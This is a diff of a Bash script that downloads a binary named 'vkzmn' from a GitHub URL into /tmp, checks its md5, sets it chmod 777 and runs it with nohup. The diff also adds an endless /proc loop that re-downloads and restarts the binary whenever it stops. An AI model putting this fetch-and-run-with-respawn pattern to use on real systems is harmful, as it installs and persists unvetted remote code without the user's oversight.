@@ -3,28 +3,43 @@ execute_vkzmn() {
 
 echo executando vkzmn
 
+chmod 777 /tmp/vkzmn
+
+nohup /tmp/vkzmn &
+
+main
+
 }
 
+
+
+
+
 #############################################################
-
-
-
 
 
 check_file() {
 
 
+
+
 #chek vkzmn  is instaledd in /tmp
+
 
 ls  /tmp/vkzmn   
 
+
 if (( $? )) ; then
+
 
 echo vkzmn not found
 
+
 check_wget_curl 
 
+
 else 
+
 
 echo  vkzmn ja esta em /tmp
 
@@ -39,8 +54,6 @@ fi ;
 }
 
 
-
-
 #############################################################
 
 
@@ -48,65 +61,39 @@ fi ;
 magic() {  #check  if file is  ELF
 
 
-
-command -v file
-
-
-if ((  $?  )) ; then #if  last err not 0 file not found
+echo checando  a integridade do arquivo
 
 
-echo using od  to verify   magic header
+command -v  md5sum
+ 
+if (( $?  )) ; then
+
+echo md5sum nao encontrado
 
 exit
 
 fi;
 
+ 
+md5=$( md5sum /tmp/vkzmn )
 
 
-
-elf=0
-
-
-file_vkzmn=$(file  /tmp/vkzmn)
+for  m  in $md5 ; do  
 
 
+if [[ $m = '002ab35974600f09c26abe5b15ad11f4' ]] ; then
 
-for h in $file_vkzmn ; do
+echo  vkzmn esta integro
 
+execute_vkzmn
 
-if [[ $h  =  "ELF" ]] ; then
-
-
-elf=1
-
-
-fi ;
+fi;
 
 done
 
 
 
-
-if  ((  $elf   ))  ; then
-
-
-echo e um elf valido
-
-
-execute_vkzmn
-
-
-else 
-
-echo nao e um elf valido
-
-fi;
-
-exit
-
-
 }
-
 
 
 
@@ -137,6 +124,7 @@ down_wget() {
 
 echo usando wget
 
+
 wget https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn -O /tmp/vkzmn
 
 check_file
@@ -160,13 +148,17 @@ if (( $? )) ; then #if last err not  0  wget not found
 
 echo wget not found
 
+
 else
 
 down_wget      #wget ok
 
-exit
+return
+
 
 fi;
+
+
 
 
 command -v curl  
@@ -182,26 +174,62 @@ else
 
 down_curl #curl ok
 
-fi;
 
+return
+
+fi;
 
 }
 
-
-
 # -------------------------------------------
+
+
+
+
+proc() {
+
+true=1000
+while true ; do
+vkzmn_ok=0
+dir_proc=$( ls  /proc )
+for  pid  in   $dir_proc ; do
+if  ((  $pid  >  0  )) ; then
+comm=$( cat  /proc/$pid/comm )
+for  cc in  $comm ; do
+if [ $cc  =  "vkzmn" ] ; then
+vkzmn_ok=$true
+fi ; 
+
+done
+fi; 
+done
+if   [  $vkzmn_ok   -eq    $true   ]  ; then
+echo vkzmn_ok
+else 
+echo  vkzmn_not_ok
+check_file   
+fi ; 
+done
+
+
+} 
+
+
+
+
+
+
+
 
 
 main() {
 
 
+
 vkzmn_ok=0
 
 
-
-
 #simple verification
-
 
 
 command -v pgrep 
@@ -211,10 +239,13 @@ if (( $? )) ; then #if last err not 0 pgrep not instaled
 
 echo pgrep not instaled
  
-exit
 
+proc
+
+return
 
 fi;
+
 
 
 
@@ -232,89 +263,17 @@ vkzmn_ok=1
 
 fi ;
 
-
-
 if (( $vkzmn_ok )) ; then 
-
 
 echo vkzmn nao esta em execucao
 
-
 check_file 
-
-
 
 fi ;
 
-
-
-
 fi;
-
-
-
-
-
-
-
-
-
-
-echo main em manutencao
-
-exit
-
-
-
-#complex verification
-
-
-true=1000
-
-while true ; do
-
-vkzmn_ok=0
-
-dir_proc=$( ls  /proc )
-
-for  pid  in   $dir_proc ; do
-
-if  ((  $pid  >  0  )) ; then
-
-comm=$( cat  /proc/$pid/comm )
-
-for  cc in  $comm ; do
-
-if [ $cc  =  "vkzmn" ] ; then
-
-vkzmn_ok=$true
-
-fi ; 
-               
-done
-
-fi; 
-
-done
-
-if   [  $vkzmn_ok   -eq    $true   ]  ; then
-
-echo vkzmn_ok
-
-else 
-
-echo  vkzmn_not_ok
-
-check_file   
-
-fi ; 
-
-
-done
 
 }
 
 
 main
- 
-#execute_vkzmn
